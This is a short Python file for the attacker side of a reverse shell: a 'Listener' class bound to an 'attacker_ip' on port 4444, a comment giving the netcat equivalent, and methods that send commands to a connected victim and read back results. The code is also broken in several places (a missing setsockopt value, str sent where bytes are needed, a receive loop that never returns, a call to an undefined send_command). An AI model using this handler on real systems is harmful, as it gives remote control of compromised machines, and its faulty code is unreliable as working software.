import json
import socket 
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

# netcat alternative :  nc -vv -l -p 4444


class Listener:
    def __init__(self, attacker_ip, port=4444):
        listener = socket.socket(AF_INET, SOCK_STREAM)
        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR)
        listener.bind((attacker_ip, port))
        listener.listen(0)
        print('[+] Waiting for imcomming connections ...')

        self.connection, address = listener.accept()
        print(f'[+] New connection from {address}')

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024)
            except ValueError:
                continue 

    def execute_system_command(self, command):
        self.send(command)
        return self.receive()


    def run(self):
        while True:
            command = input('>> ')
            result = self.send_command()
            print(result)

